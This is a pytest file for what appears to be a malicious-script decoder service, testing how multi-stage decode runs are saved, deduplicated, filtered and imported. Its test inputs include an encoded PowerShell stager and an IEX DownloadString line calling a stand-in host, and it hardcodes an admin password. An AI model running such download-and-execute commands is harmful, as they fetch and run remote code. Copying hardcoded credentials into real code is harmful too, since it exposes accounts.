"""Pytest coverage for Chain Persistence (P0 Feb-2026).

Verifies that:
  1. POST /api/decode/chain persists the multi-stage run into
     the `investigations` collection with kind == "chain".
  2. The record survives a full round-trip via GET /api/history/{id}
     and includes stages + aggregate + stage_labels.
  3. Re-running the same multi-stage set bumps run_count instead of
     duplicating.
  4. Filtering the history list with `kind=chain` isolates chain records.
  5. Single-stage records are unaffected (backward compat).
  6. Import bundle round-trip preserves the chain kind + stages.
"""
import os
import time

import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/") or "http://localhost:8001"
if BASE_URL == "http://localhost:8001":
    try:
        with open("/app/frontend/.env") as f:
            for line in f:
                if line.startswith("REACT_APP_BACKEND_URL="):
                    BASE_URL = line.split("=", 1)[1].strip().rstrip("/")
    except Exception:
        pass

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def auth():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=30)
    assert r.status_code == 200, f"login failed: {r.text}"
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def _unique_stages(seed):
    """Two stages with a `seed` marker inside so we can dedup between test runs."""
    return {
        "stages": [
            {"input": f"powershell -e ZQBjAGgAbwAgAHsAdABlAHMAdAA9AH{seed}A=", "label": "stager"},
            {"input": (f"IEX (New-Object Net.WebClient).DownloadString('http://malicious-{seed}.example/x.ps1')"),
             "label": "downloader"},
        ]
    }


class TestChainPersistence:
    def test_chain_decode_creates_history_record(self, auth):
        body = _unique_stages(f"cp{int(time.time())}")
        r = requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        assert r.status_code == 200, r.text
        data = r.json()
        assert "history_id" in data, "chain endpoint must return history_id"
        assert data.get("stage_count") == 2
        agg = data.get("aggregate") or {}
        assert agg.get("risk", {}).get("verdict")

        # Fetch back via history endpoint
        hid = data["history_id"]
        h = requests.get(f"{BASE_URL}/api/history/{hid}", headers=auth, timeout=15)
        assert h.status_code == 200, h.text
        rec = h.json()
        assert rec["kind"] == "chain"
        assert rec["stage_count"] == 2
        stages = rec.get("stages") or []
        assert len(stages) == 2
        assert stages[0].get("stage_index") == 0
        assert stages[1].get("stage_index") == 1
        assert (rec.get("aggregate") or {}).get("risk", {}).get("verdict")
        # Stage labels preserved
        labels = rec.get("stage_labels") or []
        assert labels == ["stager", "downloader"]

    def test_chain_rerun_bumps_run_count(self, auth):
        body = _unique_stages(f"rr{int(time.time())}")
        r1 = requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        assert r1.status_code == 200
        hid = r1.json()["history_id"]
        # Same payload again → same doc, run_count bumped
        r2 = requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        assert r2.status_code == 200
        assert r2.json()["history_id"] == hid, "duplicate multi-stage input must not create a new record"

        h = requests.get(f"{BASE_URL}/api/history/{hid}", headers=auth, timeout=15)
        assert h.json()["run_count"] >= 2

    def test_history_filter_by_kind_chain(self, auth):
        # Ensure at least one chain record exists
        body = _unique_stages(f"fk{int(time.time())}")
        requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        r = requests.get(f"{BASE_URL}/api/history?kind=chain&limit=20", headers=auth, timeout=15)
        assert r.status_code == 200
        data = r.json()
        assert data["total"] >= 1
        for item in data["items"]:
            assert item.get("kind") == "chain", f"non-chain leaked into kind=chain filter: {item}"

        # And single-stage records are still queryable via kind=single
        r2 = requests.get(f"{BASE_URL}/api/history?kind=single&limit=5", headers=auth, timeout=15)
        assert r2.status_code == 200
        for item in r2.json().get("items", []):
            assert item.get("kind") != "chain"

    def test_single_stage_backward_compat_unaffected(self, auth):
        # Run a normal /decode/smart — should record with kind default (single)
        payload = {"input": f"powershell -e ZQBjAGgAbwAgAHMAaQBuAGcAbABlAA=={int(time.time())}"}
        r = requests.post(f"{BASE_URL}/api/decode/smart", json=payload, headers=auth, timeout=30)
        assert r.status_code == 200
        # It records into history via record_investigation — fetch the newest single-record
        rlist = requests.get(f"{BASE_URL}/api/history?kind=single&limit=1", headers=auth, timeout=15)
        assert rlist.status_code == 200
        items = rlist.json().get("items") or []
        assert items, "single-stage decode must produce a history row"
        assert items[0].get("kind") != "chain"

    def test_chain_export_import_round_trip(self, auth):
        body = _unique_stages(f"ei{int(time.time())}")
        r = requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        assert r.status_code == 200
        hid = r.json()["history_id"]
        rec = requests.get(f"{BASE_URL}/api/history/{hid}", headers=auth, timeout=15).json()
        # Import the same record back — dedup should apply (same input_hash)
        # so it must not create a new document, but the payload must be accepted.
        imp = requests.post(f"{BASE_URL}/api/history/import",
                            json={"items": [rec]}, headers=auth, timeout=15)
        assert imp.status_code == 200
        j = imp.json()
        assert j["imported"] >= 1

    def test_chain_aggregate_confidence_computed(self, auth):
        body = _unique_stages(f"cf{int(time.time())}")
        r = requests.post(f"{BASE_URL}/api/decode/chain", json=body, headers=auth, timeout=30)
        assert r.status_code == 200
        hid = r.json()["history_id"]
        rec = requests.get(f"{BASE_URL}/api/history/{hid}", headers=auth, timeout=15).json()
        # Confidence should be an int in [0, 100]
        conf = rec.get("confidence")
        assert isinstance(conf, int) and 0 <= conf <= 100
        # engine label for chain records is "chain"
        assert rec.get("engine") == "chain"
